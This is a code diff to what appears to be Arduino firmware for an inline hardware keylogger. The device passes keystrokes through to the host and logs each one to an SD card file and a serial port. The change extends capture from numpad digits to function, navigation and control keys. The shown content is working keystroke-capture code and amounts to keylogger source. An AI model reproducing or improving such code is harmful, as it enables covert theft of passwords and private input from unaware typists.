@@ -61,33 +61,68 @@ class KbdRptParser : public KeyboardReportParser {
     void OnKeyPressed(uint8_t key);
 };
 
-// NumPad 0~9 HID Code mapped to digits
-char NumpadChar(uint8_t key) {
+// Keys HID Code mapped
+const char* KeysChar(uint8_t key) {
     switch(key) {
-        case 0x62: return '0'; // NumPad 0
-        case 0x59: return '1'; // NumPad 1
-        case 0x5A: return '2'; // NumPad 2
-        case 0x5B: return '3'; // NumPad 3
-        case 0x5C: return '4'; // NumPad 4
-        case 0x5D: return '5'; // NumPad 5
-        case 0x5E: return '6'; // NumPad 6
-        case 0x5F: return '7'; // NumPad 7
-        case 0x60: return '8'; // NumPad 8
-        case 0x61: return '9'; // NumPad 9
-        default: return 0;
+        case 0x62: return "0"; // NumPad 0
+        case 0x59: return "1"; // NumPad 1
+        case 0x5A: return "2"; // NumPad 2
+        case 0x5B: return "3"; // NumPad 3
+        case 0x5C: return "4"; // NumPad 4
+        case 0x5D: return "5"; // NumPad 5
+        case 0x5E: return "6"; // NumPad 6
+        case 0x5F: return "7"; // NumPad 7
+        case 0x60: return "8"; // NumPad 8
+        case 0x61: return "9"; // NumPad 9
+        case 0x29: return " [ESC] "; // Esc
+        case 0x3A: return " [F1] "; // F1
+        case 0x3B: return " [F2] "; // F2
+        case 0x3C: return " [F3] "; // F3
+        case 0x3D: return " [F4] "; // F4
+        case 0x3E: return " [F5] "; // F5
+        case 0x3F: return " [F6] "; // F6
+        case 0x40: return " [F7] "; // F7
+        case 0x41: return " [F8] "; // F8
+        case 0x42: return " [F9] "; // F9
+        case 0x43: return " [F1O] "; // F10
+        case 0x44: return " [F11] "; // F11
+        case 0x45: return " [F12] "; // F12
+        case 0x46: return " [PRINTSCREEN] "; // PrintScreen
+        case 0x47: return " [SCROLLLOCK] "; // Scroll Lock
+        case 0x48: return " [PAUSE] "; // Pause
+        case 0x2A: return " [BACKSPACE] "; // Back Space
+        case 0x49: return " [INSERT] "; // Insert
+        case 0x4A: return " [HOME] "; // Home
+        case 0x4B: return " [PAGEUP] "; // Page UP
+        case 0x4E: return " [PAGEDOWN] "; // Page Down
+        case 0x4C: return " [DELETE] "; // Delete
+        case 0x4D: return " [END] "; // End
+        case 0x52: return " [UP] "; // UP
+        case 0x51: return " [DOWN] "; // DOWN
+        case 0x50: return " [LEFT] "; // LEFT
+        case 0x4F: return " [RIGHT] "; // RIGHT
+        case 0x53: return " [NUMLOCK] "; // Num Lock
+        case 0x54: return " [NUMPAD /] "; // NumPad /
+        case 0x55: return " [NUMPAD *] "; // NumPad *
+        case 0x56: return " [NUMPAD -] "; // NumPad -
+        case 0x57: return " [NUMPAD +] "; // NumPad +
+        case 0x63: return " [NUMPAD .] "; // NumPad .
+        case 0x58: return " [NUMPADRETURN] "; // NumPad Return
+        case 0x2B: return " [TAB] "; // TAB
+        case 0x39: return " [CAPSLOCK] "; // Caps Lock
+        case 0x65: return " [MENU] "; // Menu
+        default: return nullptr;
     }
 }
 
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
     SetModifiersArd();
     Keyboard.rawrelease(key, 0);
-
     key_modifier = key | modifiersard;
     SDlog = SD.open("logs.txt", FILE_WRITE);
-
     bool written = false;
 
-    // 1️⃣ Main Keyboard ASCII mapping
+    // Main Keyboard ASCII mapping
     for (int i = 0; i < 256; i++) {
         if (pgm_read_byte(_asciimap + i) == key_modifier) {
             SDlog.write(i);
@@ -97,12 +132,12 @@ void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
         }
     }
 
-    // 2️⃣ NumPad digits fallback logging
+    // Keys digits fallback logging
     if (!written) {
-        char num = NumpadChar(key);
-        if (num != 0) {
-            SDlog.write(num);
-            Serial1.write(num);
+        const char* txt = KeysChar(key);
+        if (txt != nullptr) {
+            SDlog.print(txt);
+            Serial1.print(txt);
         }
     }
 
